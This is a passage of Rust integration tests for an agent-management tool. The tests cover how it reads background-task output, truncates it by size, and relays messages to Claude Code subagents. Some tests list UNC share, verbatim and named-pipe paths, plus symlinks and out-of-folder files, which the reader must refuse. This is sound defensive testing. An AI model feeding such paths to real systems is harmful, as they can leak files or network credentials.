        assert_eq!(row.summary.as_deref(), Some(words), "{message}");
        assert!(row.ended_at.is_some());
        // It is over, and the process still has it: its output is read from the file, which keeps
        // all of it (a failed build's first error), whole, with the line that says how it ended.
        let out = h.core.bg_task_output(&id, &row.id).await.unwrap();
        assert_eq!(out.source, "file", "{message}");
        assert!(!out.truncated);
        assert_eq!(out.total_bytes as usize, out.output.len());
        assert!(
            out.output.ends_with("\n[exited with code 0]\n"),
            "{:?}",
            out.output
        );
        assert!(out.output.contains("1\n"), "{:?}", out.output);
        // The file gone (a cleaned temporary folder), the process, which lives, has it still: the
        // end of it, the same words.
        std::fs::remove_file(row.output_file.as_deref().unwrap()).unwrap();
        let again = h.core.bg_task_output(&id, &row.id).await.unwrap();
        assert_eq!(again.source, "process", "{message}");
        assert_eq!(again.output, out.output, "{message}");
    }
}

#[tokio::test]
async fn bg_task_output_reads_the_process_while_it_lives_then_the_file() {
    use crate::plan::RunStatus;
    let h = harness("esc14-output");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&id, "commande de fond 60s".into(), vec![])
        .await
        .unwrap();
    let row = h.bg_task(&id, "Ticker", true).await;
    // It grows: a line every ~200 ms.
    h.wait("some ticks", |_| {
        std::fs::read_to_string(row.output_file.as_deref().unwrap())
            .is_ok_and(|s| s.contains("tick 3"))
    })
    .await;
    let live = h.core.bg_task_output(&id, &row.id).await.unwrap();
    assert_eq!(live.source, "process");
    assert!(live.output.starts_with("tick 1\n"), "{:?}", live.output);
    assert!(!live.truncated && live.total_bytes as usize == live.output.len());
    // The file is the whole output, written as it goes; the process's is its end.
    let file = row.output_file.clone().unwrap();
    assert!(std::fs::read_to_string(&file)
        .unwrap()
        .starts_with(&live.output));
    // The process gone, the file is what is left (its end, as the process's was).
    let gone = h.core.agent(&id).unwrap().lock().detach();
    assert!(crate::accounts::ended(&gone.unwrap()).await);
    assert_eq!(h.bg_tasks(&id)[0].status, RunStatus::Interrupted);
    let after = h.core.bg_task_output(&id, &row.id).await.unwrap();
    assert_eq!(after.source, "file");
    let whole = std::fs::read_to_string(&file).unwrap();
    assert_eq!(after.output, whole);
    assert_eq!(after.total_bytes as usize, whole.len());
    assert!(after.output.starts_with(&live.output) && !after.truncated);
}

#[tokio::test]
async fn bg_task_output_falls_back_on_the_file_when_claude_code_does_not_know_the_task_and_never_reads_any_other(
) {
    use crate::plan::{BgKind, BgTask};
    let h = harness("esc14-output-file");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    // A process that lives, to be asked: the fake does not know the tasks of this plan.
    h.turn(&id, "bonjour").await;
    let dir = h.dir.join("tasks");
    std::fs::create_dir_all(&dir).unwrap();
    let agent = h.core.agent(&id).unwrap();
    let put = |rows: Vec<BgTask>| {
        agent.lock().meta.plan = Some(crate::plan::PlanState {
            bg_tasks: rows,
            ..Default::default()
        });
    };
    let output = |task: &str| {
        let (c, id, task) = (h.core.clone(), id.clone(), task.to_string());
        async move { c.bg_task_output(&id, &task).await }
    };
    // The file of the task: its name is `<task>.output`.
    std::fs::write(dir.join("ghost.output"), "from the file\n").unwrap();
    put(vec![bg_row("ghost", Some(&dir.join("ghost.output")))]);
    let out = output("ghost").await.unwrap();
    assert_eq!(
        (
            out.source.as_str(),
            out.output.as_str(),
            out.total_bytes,
            out.truncated
        ),
        ("file", "from the file\n", 14, false)
    );
    // Not the task's file: not read, whatever it holds (the process does not know it either).
    std::fs::write(dir.join("secret.txt"), "never").unwrap();
    std::fs::write(dir.join("other.output"), "never").unwrap();
    // Named after the task, but not in a folder named `tasks`.
    std::fs::write(h.dir.join("ghost.output"), "never").unwrap();
    std::fs::create_dir_all(dir.join("sub")).unwrap();
    std::fs::write(dir.join("sub").join("ghost.output"), "never").unwrap();
    for (file, why) in [
        (dir.join("secret.txt"), "another name"),
        (dir.join("other.output"), "another task's file"),
        (dir.join("ghost.output.txt"), "a longer name"),
        (dir.join("missing").join("ghost.output"), "no such file"),
        (h.dir.join("ghost.output"), "not in a tasks folder"),
        (
            dir.join("sub").join("ghost.output"),
            "in a folder below tasks",
        ),
    ] {
        put(vec![bg_row("ghost", Some(&file))]);
        let out = output("ghost").await.unwrap();
        assert_eq!(
            (out.source.as_str(), out.output.as_str(), out.total_bytes),
            ("none", "", 0),
            "{why}"
        );
    }
    // A folder with that name is no file.
    std::fs::create_dir_all(dir.join("dir1.output")).unwrap();
    put(vec![bg_row("dir1", Some(&dir.join("dir1.output")))]);
    assert_eq!(output("dir1").await.unwrap().source, "none");
    // No file said at all.
    put(vec![bg_row("ghost", None)]);
    assert_eq!(output("ghost").await.unwrap().source, "none");
    // A task of another kind (a remote agent, a teammate) has no output to read, even with a file.
    let mut remote = bg_row("ghost", Some(&dir.join("ghost.output")));
    remote.kind = BgKind::Remote;
    put(vec![remote]);
    let out = output("ghost").await.unwrap();
    assert_eq!((out.source.as_str(), out.output.as_str()), ("none", ""));
    // A task the plan does not have is refused.
    put(vec![]);
    assert_eq!(
        output("ghost").await.unwrap_err().to_string(),
        "Cette tâche de fond n’est pas connue de l’agent."
    );
    // A link is not followed.
    #[cfg(unix)]
    {
        std::os::unix::fs::symlink(dir.join("secret.txt"), dir.join("lnk.output")).unwrap();
        put(vec![bg_row("lnk", Some(&dir.join("lnk.output")))]);
        assert_eq!(output("lnk").await.unwrap().source, "none");
    }
}

#[tokio::test]
async fn bg_task_output_of_a_task_that_runs_is_the_end_of_its_file_8_kib_at_most_cut_at_a_character(
) {
    let h = harness("esc14-output-big");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let agent = h.core.agent(&id).unwrap();
    let dir = h.dir.join("tasks");
    std::fs::create_dir_all(&dir).unwrap();
    let put = |file: &Path| {
        agent.lock().meta.plan = Some(crate::plan::PlanState {
            bg_tasks: vec![bg_row("big", Some(file))],
            ..Default::default()
        });
    };
    // 40 001 bytes: the last 8 192 start inside a two-byte character, which is left out.
    let file = dir.join("big.output");
    std::fs::write(&file, format!("{}x", "é".repeat(20_000))).unwrap();
    put(&file);
    let out = h.core.bg_task_output(&id, "big").await.unwrap();
    assert_eq!(
        (out.source.as_str(), out.total_bytes, out.truncated),
        ("file", 40_001, true)
    );
    assert_eq!(out.output.len(), 8_191);
    assert!(out.output.starts_with('é') && out.output.ends_with("éx"));
    assert!(!out.output.contains('\u{FFFD}'));
    // A file of exactly 8 KiB is whole.
    std::fs::write(&file, "y".repeat(8_192)).unwrap();
    let out = h.core.bg_task_output(&id, "big").await.unwrap();
    assert_eq!(
        (out.output.len(), out.total_bytes, out.truncated),
        (8_192, 8_192, false)
    );
    // A byte over, and the first is not in it.
    std::fs::write(&file, format!("z{}", "y".repeat(8_192))).unwrap();
    let out = h.core.bg_task_output(&id, "big").await.unwrap();
    assert_eq!(
        (out.output.len(), out.total_bytes, out.truncated),
        (8_192, 8_193, true)
    );
    assert!(!out.output.contains('z'));
    // Bytes that are no text are read lossily, never an error.
    std::fs::write(&file, [b'a', 0xFF, 0xFE, b'b']).unwrap();
    let out = h.core.bg_task_output(&id, "big").await.unwrap();
    assert_eq!(out.output, "a\u{FFFD}\u{FFFD}b");
}

/// A row of a task with the status `status` and the file its output is in.
fn bg_row_as(id: &str, file: Option<&Path>, status: crate::plan::RunStatus) -> crate::plan::BgTask {
    crate::plan::BgTask {
        status,
        ..bg_row(id, file)
    }
}

#[tokio::test]
async fn bg_task_output_of_a_task_that_is_over_is_its_file_up_to_256_kib_cut_at_a_character() {
    use crate::plan::RunStatus;
    use crate::taskout::{MAX_FINISHED_OUTPUT, MAX_OUTPUT};
    let h = harness("esc14-output-over");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    // A process that lives and does not know these tasks: only the file can tell.
    h.turn(&id, "bonjour").await;
    let agent = h.core.agent(&id).unwrap();
    let dir = h.dir.join("tasks");
    std::fs::create_dir_all(&dir).unwrap();
    let file = dir.join("big.output");
    let put = |status: RunStatus| {
        agent.lock().meta.plan = Some(crate::plan::PlanState {
            bg_tasks: vec![bg_row_as("big", Some(&file), status)],
            ..Default::default()
        });
    };

    // 100 KiB, whole, with the first error of the build at its start, whatever way it ended.
    let hundred = format!("FIRST ERROR\n{}", "y".repeat(100 * 1024 - 12));
    assert_eq!(hundred.len(), 100 * 1024);
    std::fs::write(&file, &hundred).unwrap();
    for status in [
        RunStatus::Done,
        RunStatus::Failed,
        RunStatus::Stopped,
        RunStatus::Interrupted,
    ] {
        put(status);
        let out = h.core.bg_task_output(&id, "big").await.unwrap();
        assert_eq!(
            (out.source.as_str(), out.total_bytes, out.truncated),
            ("file", 100 * 1024, false),
            "{status:?}"
        );
        assert_eq!(out.output, hundred, "{status:?}");
    }

    // 300 KiB of characters of two and three bytes: the last 256 KiB, from a whole character.
    let long: String = "é€".repeat(61_440);
    assert_eq!(long.len(), 300 * 1024);
    std::fs::write(&file, &long).unwrap();
    put(RunStatus::Failed);
    let out = h.core.bg_task_output(&id, "big").await.unwrap();
    assert_eq!(
        (out.source.as_str(), out.total_bytes, out.truncated),
        ("file", 300 * 1024, true)
    );
    // 262 144 bytes, less the character the cut falls in (3 bytes at most).
    assert!(
        out.output.len() <= MAX_FINISHED_OUTPUT,
        "{}",
        out.output.len()
    );
    assert!(
        out.output.len() > MAX_FINISHED_OUTPUT - 3,
        "{}",
        out.output.len()
    );
    assert!(out.output.starts_with(['é', '€']));
    assert!(!out.output.contains('\u{FFFD}'));
    assert!(long.ends_with(&out.output));
    // Exactly 256 KiB is whole; a byte over, and the first one is not in it.
    std::fs::write(&file, "y".repeat(MAX_FINISHED_OUTPUT)).unwrap();
    let out = h.core.bg_task_output(&id, "big").await.unwrap();
    assert_eq!(
        (out.output.len(), out.total_bytes, out.truncated),
        (MAX_FINISHED_OUTPUT, MAX_FINISHED_OUTPUT as u64, false)
    );
    std::fs::write(&file, format!("z{}", "y".repeat(MAX_FINISHED_OUTPUT))).unwrap();
    let out = h.core.bg_task_output(&id, "big").await.unwrap();
    assert_eq!(
        (out.output.len(), out.total_bytes, out.truncated),
        (MAX_FINISHED_OUTPUT, MAX_FINISHED_OUTPUT as u64 + 1, true)
    );
    assert!(!out.output.contains('z'));

    // The same 300 KiB while the task runs: 8 KiB, whether the process (which does not answer
    // for it) lives or not.
    std::fs::write(&file, &long).unwrap();
    put(RunStatus::Running);
    let check = |out: &crate::taskout::TaskOutput, what: &str| {
        assert_eq!(
            (out.source.as_str(), out.total_bytes, out.truncated),
            ("file", 300 * 1024, true),
            "{what}"
        );
        assert!(
            out.output.len() <= MAX_OUTPUT,
            "{what}: {}",
            out.output.len()
        );
        assert!(
            out.output.len() > MAX_OUTPUT - 3,
            "{what}: {}",
            out.output.len()
        );
        assert!(long.ends_with(&out.output) && !out.output.contains('\u{FFFD}'));
    };
    check(
        &h.core.bg_task_output(&id, "big").await.unwrap(),
        "a process that does not know the task",
    );
    let live = agent.lock().proc.take();
    check(
        &h.core.bg_task_output(&id, "big").await.unwrap(),
        "no process",
    );
    // And over, with no process either: the file, as far back.
    put(RunStatus::Done);
    let out = h.core.bg_task_output(&id, "big").await.unwrap();
    assert_eq!(out.source, "file");
    assert!(out.output.len() > MAX_FINISHED_OUTPUT - 3 && out.truncated);
    // Over, and nothing to read it from: nothing.
    std::fs::remove_file(&file).unwrap();
    assert_eq!(
        h.core.bg_task_output(&id, "big").await.unwrap(),
        crate::taskout::TaskOutput::none()
    );
    agent.lock().proc = live;
    assert_eq!(
        h.core.bg_task_output(&id, "big").await.unwrap(),
        crate::taskout::TaskOutput::none(),
        "the process does not know the task either"
    );
}

#[tokio::test]
async fn bg_task_output_of_a_task_that_is_over_falls_back_on_the_process_when_its_file_is_unreadable(
) {
    use crate::plan::RunStatus;
    let h = harness("esc14-output-over-process");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&id, "commande de fond 60s".into(), vec![])
        .await
        .unwrap();
    let row = h.bg_task(&id, "Ticker", true).await;
    h.core.stop_bg_task(&id, &row.id).await.unwrap();
    h.bg_task_status(&id, &row.id, RunStatus::Stopped).await;
    let agent = h.core.agent(&id).unwrap();
    let file = row.output_file.clone().unwrap();
    let output = || h.core.bg_task_output(&id, &row.id);
    // Over, with its file: the file, to its last line.
    let out = output().await.unwrap();
    assert_eq!(out.source, "file");
    assert!(out.output.ends_with("\n[killed]\n"), "{:?}", out.output);
    let whole = out.output.clone();
    // Its file refused (a share of another machine), or not told, or gone: the process has it.
    let set = |file: Option<&str>| {
        agent.lock().meta.plan.as_mut().unwrap().bg_tasks[0].output_file = file.map(str::to_string);
    };
    for (told, why) in [
        (
            Some(r"\\nonexistent.invalid\share\tasks\x.output".to_string()),
            "a share",
        ),
        (None, "no file told"),
        (
            Some(file.replace(&format!("{}.output", row.id), "gone.output")),
            "another name",
        ),
    ] {
        set(told.as_deref());
        let out = output().await.unwrap();
        assert_eq!(out.source, "process", "{why}");
        assert_eq!(out.output, whole, "{why}");
    }
    // The file back: the file again.
    set(Some(&file));
    assert_eq!(output().await.unwrap().source, "file");
    // Its file gone, and no process to ask: nothing.
    std::fs::remove_file(&file).unwrap();
    let live = agent.lock().proc.take();
    assert_eq!(output().await.unwrap(), crate::taskout::TaskOutput::none());
    agent.lock().proc = live;
    assert_eq!(output().await.unwrap().source, "process");
}

#[tokio::test]
async fn bg_task_output_never_reads_a_file_of_another_machine() {
    use crate::plan::RunStatus;
    let h = harness("esc14-output-unc");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    // A process that lives and knows none of these tasks.
    h.turn(&id, "bonjour").await;
    let agent = h.core.agent(&id).unwrap();
    let put = |file: &str, status: RunStatus| {
        let mut row = bg_row_as("b1", None, status);
        row.output_file = Some(file.to_string());
        agent.lock().meta.plan = Some(crate::plan::PlanState {
            bg_tasks: vec![row],
            ..Default::default()
        });
    };
    // A host that does not exist: a system that would look for it waits for its answer. The paths
    // are refused as the frames said them, without touching the disk, the network or the process
    // when it has no answer: nothing to wait for.
    let refused = [
        r"\\nonexistent.invalid\share\tasks\b1.output",
        "//nonexistent.invalid/share/tasks/b1.output",
        r"\/nonexistent.invalid/share/tasks/b1.output",
        r"\\?\UNC\nonexistent.invalid\share\tasks\b1.output",
        r"\\?\C:\nonexistent\tasks\b1.output",
        r"\\.\pipe\tasks\b1.output",
    ];
    for status in [RunStatus::Running, RunStatus::Done] {
        for file in refused {
            put(file, status);
            let out = h.core.bg_task_output(&id, "b1").await.unwrap();
            assert_eq!(
                out,
                crate::taskout::TaskOutput::none(),
                "{file} ({status:?})"
            );
        }
    }
    // A real file of this machine, told in a form that is refused: were it read, it would be
    // found (a verbatim path on Windows, a path with two slashes elsewhere), and a host that does
    // not exist would not tell. Told plainly, it is read.
    let dir = h.dir.join("tasks");
    std::fs::create_dir_all(&dir).unwrap();
    let real = dir.join("b1.output").to_string_lossy().to_string();
    std::fs::write(&real, "local\n").unwrap();
    let doubled = if cfg!(windows) {
        format!(r"\\?\{real}")
    } else {
        format!("/{real}")
    };
    for status in [RunStatus::Running, RunStatus::Done] {
        put(&real, status);
        let out = h.core.bg_task_output(&id, "b1").await.unwrap();
        assert_eq!(
            (out.source.as_str(), out.output.as_str()),
            ("file", "local\n")
        );
        put(&doubled, status);
        let out = h.core.bg_task_output(&id, "b1").await.unwrap();
        assert_eq!(
            out,
            crate::taskout::TaskOutput::none(),
            "{doubled} ({status:?})"
        );
    }
    // With nothing to ask either: at once.
    let live = agent.lock().proc.take();
    let started = std::time::Instant::now();
    for status in [RunStatus::Running, RunStatus::Done] {
        for file in refused {
            put(file, status);
            let out = h.core.bg_task_output(&id, "b1").await.unwrap();
            assert_eq!(out.source, "none", "{file} ({status:?})");
        }
    }
    assert!(
        started.elapsed() < Duration::from_secs(1),
        "read {:?}",
        started.elapsed()
    );
    agent.lock().proc = live;
}

#[tokio::test]
async fn a_command_sent_to_the_background_from_the_foreground_is_listed_then_and_can_be_stopped() {
    use crate::plan::RunStatus;
    let h = harness("esc14-foreground-flip");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&id, "commande premier plan 60s".into(), vec![])
        .await
        .unwrap();
    // The agent waits for it: the turn goes on, nothing is listed.
    h.wait("the command's call", |h| {
        h.items(&id)
            .iter()
            .any(|i| i["kind"] == "tool" && i["name"] == "Bash")
    })
    .await;
    assert!(h.bg_tasks(&id).is_empty());
    let call = h
        .items(&id)
        .into_iter()
        .find(|i| i["name"] == "Bash")
        .unwrap()["id"]
        .as_str()
        .unwrap()
        .to_string();
    // Sent to the background, as Ctrl+B does (the control request of the same name).
    let proc = h.core.agent(&id).unwrap().lock().proc.clone().unwrap();
    proc.control(
        json!({"subtype": "background_tasks", "tool_use_id": call}),
        Duration::from_secs(10),
    )
    .await
    .unwrap();
    let row = h.bg_task(&id, "Foreground loop", true).await;
    assert_eq!(row.status, RunStatus::Running);
    assert_eq!(row.call.as_deref(), Some(call.as_str()));
    assert!(row.command.as_deref().is_some_and(|c| c.contains("fg")));
    h.core.stop_bg_task(&id, &row.id).await.unwrap();
    h.bg_task_status(&id, &row.id, RunStatus::Stopped).await;
}

#[tokio::test]
async fn a_background_command_keeps_a_restart_of_the_agent_from_killing_it() {
    use crate::plan::RunStatus;
    let h = harness("esc14-restart-refused");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&id, "commande de fond 60s".into(), vec![])
        .await
        .unwrap();
    let row = h.bg_task(&id, "Ticker", true).await;
    h.wait("the turn over", |h| !h.agent(&id).status.is_active())
        .await;
    let refused = h.core.restart_process(&id).await.unwrap_err();
    assert!(refused.to_string().contains("travaille"), "{refused:#}");
    h.core.stop_bg_task(&id, &row.id).await.unwrap();
    h.bg_task_status(&id, &row.id, RunStatus::Stopped).await;
}

#[tokio::test]
async fn a_message_to_a_subagent_goes_to_its_agent_which_is_asked_to_pass_it_on() {
    let h = harness("esc13-message-subagent");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&id, "sous-agent long".into(), vec![])
        .await
        .unwrap();
    h.wait("the subagent's request", |h| {
        h.agent(&id).status == AgentStatus::Waiting
    })
    .await;
    h.core
        .answer_permission(&id, "req_subperm", "allow", None)
        .unwrap();
    let call = h.agent(&id).plan.unwrap().agents[0].id.clone();
    // Nothing to say, or a subagent it never had (it does not run, as one that ended does not):
    // refused, nothing sent.
    let refused = |e: anyhow::Error| e.to_string();
    assert_eq!(
        refused(h.core.message_subagent(&id, &call, "  ").await.unwrap_err()),
        "Le message est vide."
    );
    assert_eq!(
        refused(
            h.core
                .message_subagent(&id, "toolu_nobody", "Salut")
                .await
                .unwrap_err()
        ),
        "Ce sous-agent ne tourne plus."
    );
    h.core
        .message_subagent(&id, &call, "Regarde aussi le port 3001.")
        .await
        .unwrap();
    h.wait("the message", |h| {
        h.stdin_messages(&r)
            .iter()
            .any(|m| m["message"]["content"].to_string().contains("port 3001"))
    })
    .await;
    let sent = h
        .stdin_messages(&r)
        .into_iter()
        .find(|m| m["message"]["content"].to_string().contains("port 3001"))
        .unwrap();
    let text = sent["message"]["content"].to_string();
    for part in [
        "SendMessage",
        "fakelong-agent",
        "« Surveiller le serveur »",
        "Regarde aussi le port 3001.",
    ] {
        assert!(text.contains(part), "{part} in {text}");
    }

    // A subagent in the foreground would get it only once it ended: refused.
    let foreground = |h: &Harness, background: bool| {
        let handle = h.core.agent(&id).unwrap();
        let mut rt = handle.lock();
        rt.meta.plan.as_mut().unwrap().agents[0].background = background;
    };
    foreground(&h, false);
    assert_eq!(
        refused(
            h.core
                .message_subagent(&id, &call, "Au premier plan")
                .await
                .unwrap_err()
        ),
        "Ce sous-agent travaille au premier plan : l’agent ne lui transmettrait le message qu’une fois fini."
    );
    foreground(&h, true);
    // Nor in the Claude Code view (its interface does it), nor to an archived agent's.
    h.core.agent(&id).unwrap().lock().meta.terminal = true;
    assert_eq!(
        refused(
            h.core
                .message_subagent(&id, &call, "En vue Claude Code")
                .await
                .unwrap_err()
        ),
        "En vue Claude Code, on écrit à un sous-agent depuis l’interface de Claude Code."
    );
    h.core.agent(&id).unwrap().lock().meta.terminal = false;
    h.core.archive_agent(&id, true).await.unwrap();
    assert_eq!(
        refused(
            h.core
                .message_subagent(&id, &call, "Archivé")
                .await
                .unwrap_err()
        ),
        "L’agent est archivé."
    );
    let sent = h
        .stdin_messages(&r)
        .iter()
        .filter(|m| m["message"]["content"].to_string().contains("SendMessage"))
        .count();
    assert_eq!(sent, 1, "nothing else was sent");
}

#[tokio::test]
async fn a_message_to_a_subagent_that_ended_is_refused_whatever_its_end_and_nothing_is_sent() {
    use crate::plan::RunStatus;
    let h = harness("esc107-message-over");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&id, "sous-agent long".into(), vec![])
        .await
        .unwrap();
    h.wait("the subagent's request", |h| {
        h.agent(&id).status == AgentStatus::Waiting
    })
    .await;
    h.core
        .answer_permission(&id, "req_subperm", "allow", None)
        .unwrap();
    let call = h.agent(&id).plan.unwrap().agents[0].id.clone();
    // The messages the process got that ask it to pass something on to a subagent.
    let passed_on = |h: &Harness| {
        h.stdin_messages(&r)
            .iter()
            .filter(|m| m["message"]["content"].to_string().contains("SendMessage"))
            .count()
    };
    let stands = |status: RunStatus| {
        h.core
            .agent(&id)
            .unwrap()
            .lock()
            .meta
            .plan
            .as_mut()
            .unwrap()
            .agents[0]
            .status = status;
    };
    let prompts = h.agent(&id).prompts;
    for status in [
        RunStatus::Done,
        RunStatus::Stopped,
        RunStatus::Failed,
        RunStatus::Interrupted,
    ] {
        stands(status);
        // In the background and with a task told: its end is the only reason.
        let row = h.agent(&id).plan.unwrap().agents[0].clone();
        assert!(row.background && row.task_id.is_some(), "{row:?}");
        // The window's way, and the server's (with an author).
        let said = [
            h.core.message_subagent(&id, &call, "Encore").await,
            h.core
                .message_subagent_from(&id, &call, "Encore", Some("agent-2"))
                .await,
        ]
        .map(|r| r.unwrap_err().to_string());
        assert_eq!(
            said, ["Ce sous-agent ne tourne plus."; 2],
            "{status:?}: said"
        );
    }
    assert_eq!(passed_on(&h), 0, "nothing was passed on");
    assert_eq!(h.agent(&id).prompts, prompts, "no turn was spent");
    // The same row, going on: the message goes through.
    stands(RunStatus::Running);
    h.core
        .message_subagent(&id, &call, "Ça tourne encore")
        .await
        .unwrap();
    h.wait("the message", |h| passed_on(h) == 1).await;
}

#[tokio::test]
async fn the_refusals_of_a_message_to_a_subagent_come_in_the_order_archived_view_ended_foreground_task(
) {
    use crate::plan::{PlanState, RunStatus, SubAgent};
    let h = harness("esc107-message-order");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let sub = |call: &str, status: RunStatus, background: bool, task: Option<&str>| SubAgent {
        id: call.into(),
        title: call.into(),
        status,
        background,
        task_id: task.map(str::to_string),
        started_at: 1,
        ..Default::default()
    };
    h.core.agent(&id).unwrap().lock().meta.plan = Some(PlanState {
        agents: vec![
            sub("ok", RunStatus::Running, true, Some("t-ok")),
            // Running in the foreground, with no task told.
            sub("fg", RunStatus::Running, false, None),
            // Over, in the foreground and with no task: over comes first.
            sub("over-fg", RunStatus::Done, false, None),
            sub("over", RunStatus::Stopped, true, Some("t-over")),
            sub("notask", RunStatus::Running, true, None),
        ],
        ..Default::default()
    });
    let said = |call: &'static str| {
        let (core, id) = (h.core.clone(), id.clone());
        async move {
            core.message_subagent(&id, call, "Salut")
                .await
                .unwrap_err()
                .to_string()
        }
    };
    let over = "Ce sous-agent ne tourne plus.";
    let foreground = "Ce sous-agent travaille au premier plan : l’agent ne lui transmettrait le message qu’une fois fini.";
    let no_task =
        "Claude Code n’a pas donné la tâche de ce sous-agent : on ne peut pas lui écrire.";
    for (call, expected) in [
        ("fg", foreground),
        ("over", over),
        ("over-fg", over),
        ("notask", no_task),
        // A subagent the plan does not have does not run.
        ("nobody", over),
    ] {
        assert_eq!(said(call).await, expected, "{call}");
    }
    // The Claude Code view comes before all of them: the message is typed in its interface.
    let view = "En vue Claude Code, on écrit à un sous-agent depuis l’interface de Claude Code.";
    h.core.agent(&id).unwrap().lock().meta.terminal = true;
    for call in ["ok", "over", "fg", "nobody"] {
        assert_eq!(said(call).await, view, "{call}");
    }
    // An archived agent before even that.
    h.core.agent(&id).unwrap().lock().meta.archived = true;
    for call in ["ok", "over", "nobody"] {
        assert_eq!(said(call).await, "L’agent est archivé.", "{call}");
    }
    assert_eq!(h.agent(&id).prompts, 0);
    assert!(h.stdin_messages(&r).is_empty(), "nothing was sent");
}

#[test]
fn the_message_that_asks_an_agent_to_pass_words_on_to_its_subagent_is_in_claudes_language() {
    use crate::engine::Engine;
    use crate::i18n::Lang;
    // The engine says it, its own tool named: Claude Code's SendMessage.
    let relay = |lang, title, text| {
        crate::engine::CLAUDE
            .subagent_relay(lang, title, "a1b2", text)
            .unwrap()
    };
    let fr = relay(Lang::Fr, "Chercher", "Et les PDF ?");
    assert!(fr.starts_with("Transmets ce message au sous-agent « Chercher »"));
    assert!(fr.contains("a1b2") && fr.ends_with("Et les PDF ?"));
    let en = relay(Lang::En, "Search", "And the PDFs?");
    assert!(en.starts_with("Pass this message on to the subagent “Search”"));
    assert!(en.contains("SendMessage") && en.ends_with("And the PDFs?"));
}

#[tokio::test]
async fn a_subagent_that_hands_back_its_report_keeps_it_with_its_call() {
    use crate::plan::RunStatus;
    let h = harness("esc13-report");
    let (p, _r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&id, "sous-agent fini".into(), vec![])
        .await
        .unwrap();
    h.wait("the subagent's request", |h| {
        h.agent(&id).status == AgentStatus::Waiting
    })
    .await;
    h.core
        .answer_permission(&id, "req_subperm", "allow", None)
        .unwrap();
    h.wait("its end", |h| {
        h.agent(&id)
            .plan
            .is_some_and(|p| p.agents[0].status == RunStatus::Done)
    })
    .await;
    let row = h.agent(&id).plan.unwrap().agents[0].clone();
    let call = h
        .items(&id)
        .into_iter()
        .find(|i| i["id"] == row.id.as_str())
        .unwrap();
    assert!(call["report"]
        .as_str()
        .unwrap()
        .starts_with("**Cause trouvée**"));
    assert_eq!(call["run"]["tokens"], 4200);
    assert_eq!(call["input"]["subagent_type"], "general-purpose");
}

// ---------- a subagent's report and a message from an author (ESC-107) ----------

#[tokio::test]
async fn a_message_to_a_subagent_from_an_author_is_passed_on_under_the_name_of_that_author() {
    let h = harness("esc107-message-from");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&id, "sous-agent long".into(), vec![])
        .await
        .unwrap();
    h.wait("the subagent's request", |h| {
        h.agent(&id).status == AgentStatus::Waiting
    })
    .await;
    h.core
        .answer_permission(&id, "req_subperm", "allow", None)
        .unwrap();
    let call = h.agent(&id).plan.unwrap().agents[0].id.clone();
    let sent = |h: &Harness, part: &str| {
        h.stdin_messages(&r)
            .into_iter()
            .map(|m| {
                m["message"]["content"]
                    .as_str()
                    .unwrap_or_default()
                    .to_string()
            })
            .find(|c| c.contains(part))
    };

    // Nothing to say: refused whoever writes, and the author's name does not make it a message.
    let empty = h
        .core
        .message_subagent_from(&id, &call, "  ", Some("agent-2"))
        .await
        .unwrap_err();
    assert_eq!(empty.to_string(), "Le message est vide.");
    let before = h.stdin_messages(&r).len();

    // From an author: the agent is asked to pass on his words under his name, never as the user's.
    h.core
        .message_subagent_from(&id, &call, "  Regarde le port 3001.  ", Some("agent-2"))
        .await
        .unwrap();
    h.wait("the message", |h| sent(h, "port 3001").is_some())
        .await;
    let text = sent(&h, "port 3001").unwrap();
    assert_eq!(h.stdin_messages(&r).len(), before + 1, "{text}");
    assert!(
        text.starts_with(
            "Transmets ce message au sous-agent « Surveiller le serveur » (agentId fakelong-agent)"
        ),
        "{text}"
    );
    assert!(text.contains("SendMessage"), "{text}");
    assert!(
        text.ends_with("\n\nMessage de agent-2 : Regarde le port 3001."),
        "{text}"
    );
    h.wait("the turn to end", |h| !h.agent(&id).status.is_active())
        .await;

    // Without one it is what it was: the words as they are.
    h.core
        .message_subagent(&id, &call, "Et le port 3002 ?")
        .await
        .unwrap();
    h.wait("the message", |h| sent(h, "port 3002").is_some())
        .await;
    let plain = sent(&h, "port 3002").unwrap();
    assert!(plain.ends_with("\n\nEt le port 3002 ?"), "{plain}");
    assert!(!plain.contains("Message de"), "{plain}");
    h.wait("the turn to end", |h| !h.agent(&id).status.is_active())
        .await;
    h.core
        .message_subagent_from(&id, &call, "Et le 3003 ?", None)
        .await
        .unwrap();
    h.wait("the message", |h| sent(h, "3003").is_some()).await;
    assert!(!sent(&h, "3003").unwrap().contains("Message de"));

    // The refusals are the same with an author: a subagent in the foreground, the Claude Code view.
    h.wait("the turn to end", |h| !h.agent(&id).status.is_active())
        .await;
    let all = h.stdin_messages(&r).len();
    let refused = |e: anyhow::Error| e.to_string();
    h.core
        .agent(&id)
        .unwrap()
        .lock()
        .meta
        .plan
        .as_mut()
        .unwrap()
        .agents[0]
        .background = false;
    assert!(refused(
        h.core
            .message_subagent_from(&id, &call, "Au premier plan", Some("agent-2"))
            .await
            .unwrap_err()
    )
    .starts_with("Ce sous-agent travaille au premier plan"));
    h.core
        .agent(&id)
        .unwrap()
        .lock()
        .meta
        .plan
        .as_mut()
        .unwrap()
        .agents[0]
